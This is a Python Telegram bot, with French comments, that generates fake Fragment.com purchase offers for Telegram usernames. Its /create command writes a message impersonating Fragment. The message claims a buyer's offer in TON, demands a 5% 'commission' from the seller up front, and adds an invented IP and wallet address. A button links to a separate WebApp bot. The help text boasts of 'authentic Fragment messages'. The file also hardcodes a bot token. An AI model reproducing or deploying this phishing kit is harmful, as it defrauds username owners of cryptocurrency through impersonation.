import asyncio
import aiohttp
import sys
import os
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError, TimedOut, Conflict

# Configuration du logging
import logging
import warnings
warnings.filterwarnings("ignore", category=RuntimeWarning)
logging.basicConfig(level=logging.CRITICAL)  # Seulement les erreurs critiques

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))

print(f"🤖 Fragment Deal Generator v2.1")
print(f"🔑 Token: ✅")
print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
print(f"🌐 Port: {PORT}")

# ===== SERVEUR HTTP POUR RENDER =====
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ['/', '/health', '/status']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            
            status_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment Bot Status</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 50px; background: #f0f8ff; }
        .container { max-width: 600px; margin: 0 auto; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .status { color: #28a745; font-weight: bold; }
        .info { background: #e7f3ff; padding: 15px; border-radius: 5px; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Fragment Deal Generator</h1>
        <p class="status">✅ Bot Status: ACTIVE</p>
        <div class="info">
            <p><strong>🔗 Telegram:</strong> @BidRequestWebApp_bot</p>
            <p><strong>📊 Service:</strong> Running on Render</p>
            <p><strong>🕐 Last Check:</strong> """ + time.strftime('%Y-%m-%d %H:%M:%S UTC') + """</p>
        </div>
        <p>Ready to generate Fragment deals! 💎</p>
    </div>
</body>
</html>"""
            self.wfile.write(status_html.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Supprime les logs HTTP

def start_health_server():
    """Démarre le serveur de santé pour Render"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), HealthCheckHandler)
        print(f"🌐 Serveur HTTP actif sur port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur: {e}")

# ===== NETTOYAGE FORCÉ =====
async def force_cleanup_bot():
    """Force le nettoyage des sessions bot existantes"""
    try:
        print("🧹 Nettoyage forcé des sessions...")
        
        # Tentative de récupération des updates en attente pour les nettoyer
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Récupération avec offset élevé pour nettoyer
            cleanup_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {
                'offset': -1,
                'limit': 1,
                'timeout': 0,
                'allowed_updates': []
            }
            
            async with session.post(cleanup_url, json=params) as response:
                if response.status == 200:
                    print("✅ Nettoyage réussi")
                else:
                    print("⚠️ Nettoyage partiel")
        
        # Attente pour s'assurer que le nettoyage est effectif
        await asyncio.sleep(5)
        
    except Exception as e:
        print(f"⚠️ Nettoyage: {e}")

# ===== FONCTION PRIX TON =====
async def get_ton_price():
    """Récupère le prix du TON via l'API"""
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    price = float(data.get('Price', 5.50))
                    return price if price > 0 else 5.50
                else:
                    return 5.50
    except Exception:
        return 5.50

# ===== GÉNÉRATION MESSAGE FRAGMENT =====
async def generate_fragment_message(username, price):
    """Génère le message Fragment avec wallet cliquable"""
    try:
        # Calculs
        commission = price * 0.05
        ton_to_usd = await get_ton_price()
        price_usd = price * ton_to_usd
        commission_usd = commission * ton_to_usd
        
        # Nettoyage du username
        clean_username = str(username).strip().replace('@', '').upper()
        
        # Message avec wallet cliquable (utilisation de Markdown)
        message = f"""We have received a purchase request for your username @{clean_username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: `103.56.72.245`
• Wallet: `EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U`

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""

        # Bouton WebApp
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={clean_username.lower()}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        print(f"❌ Erreur génération: {e}")
        return None, None

# ===== GESTIONNAIRE D'ERREURS =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire silencieux des erreurs"""
    try:
        error_str = str(context.error)
        if "Conflict" not in error_str and "TimedOut" not in error_str:
            print(f"⚠️ Erreur: {error_str}")
    except:
        pass

# ===== COMMANDES TELEGRAM =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    try:
        if not update or not update.message:
            return
            
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        welcome_message = f"""🤖 **Fragment Deal Generator**

Salut {user.first_name}! 

📱 **Chat ID:** `{chat_id}`

Ce bot génère des messages Fragment professionnels avec calculs TON/USD automatiques.

**📋 Commandes:**
• `/create username price` - Créer un deal Fragment
• `/help` - Guide d'utilisation

**💡 Exemple:**
`/create crypto 1500`

💎 **Prêt à générer vos deals!**"""
        
        await update.message.reply_text(
            welcome_message, 
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        
        print(f"✅ /start - {user.first_name} ({chat_id})")
        
    except Exception as e:
        print(f"❌ Erreur start: {e}")
        try:
            await update.message.reply_text("🤖 Bot démarré avec succès!")
        except:
            pass

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create username price"""
    try:
        if not update or not update.message:
            return
            
        # Validation des arguments
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Usage incorrect**\n\n"
                "**Format:** `/create username price`\n"
                "**Exemple:** `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
            
        username = str(context.args[0]).strip().replace('@', '')
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text(
                "❌ **Prix invalide**\n\n"
                "Utilisez uniquement des nombres.\n"
                "**Exemple:** `1500` ou `1500.5`",
                parse_mode='Markdown'
            )
            return
        
        # Validation du prix
        if price <= 0:
            await update.message.reply_text("❌ Le prix doit être supérieur à 0")
            return
            
        if price > 1000000:
            await update.message.reply_text("❌ Prix trop élevé (maximum: 1,000,000 TON)")
            return
            
        # Message de traitement
        processing = await update.message.reply_text("⏳ **Génération en cours...**", parse_mode='Markdown')
        
        # Génération du message Fragment
        message, reply_markup = await generate_fragment_message(username, price)
        
        if message and reply_markup:
            # Envoi du message principal avec Markdown pour le wallet cliquable
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            
            # Message de confirmation
            ton_price = await get_ton_price()
            total_usd = price * ton_price
            
            await update.message.reply_text(
                f"✅ **Deal généré avec succès!**\n\n"
                f"🎯 **Username:** @{username.upper()}\n"
                f"💎 **Prix:** {price:g} TON (${total_usd:.2f} USD)\n"
                f"📊 **Taux TON/USD:** ${ton_price:.2f}",
                parse_mode='Markdown'
            )
            
            print(f"✅ Deal créé: @{username} - {price} TON")
            
        else:
            await update.message.reply_text("❌ Erreur lors de la génération. Veuillez réessayer.")
            
        # Suppression du message de traitement
        try:
            await processing.delete()
        except:
            pass
            
    except Exception as e:
        print(f"❌ Erreur create: {e}")
        try:
            await update.message.reply_text("❌ Erreur système. Veuillez réessayer dans quelques secondes.")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande d'aide détaillée"""
    try:
        if not update or not update.message:
            return
            
        help_text = """🤖 **Fragment Deal Generator - Guide**

**📋 Commandes disponibles:**

🆕 `/start` - Informations et démarrage
🎯 `/create username price` - Créer un deal Fragment  
❓ `/help` - Afficher cette aide

**💡 Exemples d'utilisation:**
• `/create crypto 1500`
• `/create bitcoin 2000`
• `/create nft 500.5`

**🔧 Fonctionnalités:**
• Calculs automatiques TON ↔ USD
• Commission 5% incluse
• Messages Fragment authentiques
• Wallet et IP inclus

**💎 Prêt à créer vos deals Fragment!**"""
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
        print("✅ Help envoyé")
        
    except Exception as e:
        print(f"❌ Erreur help: {e}")

# ===== FONCTION PRINCIPALE BOT =====
def run_telegram_bot():
    """Lance le bot Telegram avec nettoyage préalable"""
    
    async def main_bot():
        # Nettoyage forcé avant démarrage
        await force_cleanup_bot()
        
        try:
            print("🚀 Configuration du bot...")
            
            # Configuration de l'application
            app = Application.builder().token(BOT_TOKEN).build()
            
            # Ajout des handlers
            app.add_error_handler(error_handler)
            app.add_handler(CommandHandler("start", start_command))
            app.add_handler(CommandHandler("create", create_command))
            app.add_handler(CommandHandler("help", help_command))
            
            print("✅ Handlers configurés")
            print(f"💎 Chat cible: {FIXED_CHAT_ID}")
            print("🔗 WebApp: @BidRequestWebApp_bot/WebApp")
            
            print("\n📋 **Commandes disponibles:**")
            print("   • /start - Démarrage")
            print("   • /create username price - Créer deal")
            print("   • /help - Aide")
            
            print("\n🔄 Lancement du polling...")
            
            # Démarrage avec paramètres optimisés
            await app.run_polling(
                poll_interval=2.0,
                timeout=20,
                bootstrap_retries=2,
                read_timeout=20,
                write_timeout=20,
                connect_timeout=20,
                pool_timeout=20,
                drop_pending_updates=True,
                allowed_updates=['message'],
                close_loop=False
            )
            
        except Conflict as e:
            print(f"❌ Conflit de bot: {e}")
            print("⚠️ Une autre instance semble active")
            
        except Exception as e:
            print(f"❌ Erreur bot: {e}")
            
        finally:
            print("🛑 Bot arrêté")
    
    # Lancement de la boucle asynchrone
    try:
        asyncio.run(main_bot())
    except KeyboardInterrupt:
        print("\n🛑 Arrêt manuel")
    except Exception as e:
        print(f"❌ Erreur runtime: {e}")

# ===== FONCTION PRINCIPALE =====
def main():
    """Point d'entrée de l'application"""
    print("🚀 **Fragment Deal Generator** - Démarrage...")
    print(f"🌐 URL: https://telegram-bot-vic3.onrender.com")
    print("=" * 60)
    
    try:
        # 1. Serveur HTTP en arrière-plan
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
        print("✅ Serveur HTTP démarré")
        
        # 2. Attente stabilisation
        time.sleep(3)
        
        # 3. Bot Telegram en premier plan
        print("🤖 Démarrage du bot Telegram...")
        run_telegram_bot()
        
    except KeyboardInterrupt:
        print("\n🛑 Arrêt utilisateur")
        
    except Exception as e:
        print(f"❌ Erreur critique: {e}")
        
    finally:
        print("🔚 Application fermée")

if __name__ == '__main__':
    main()
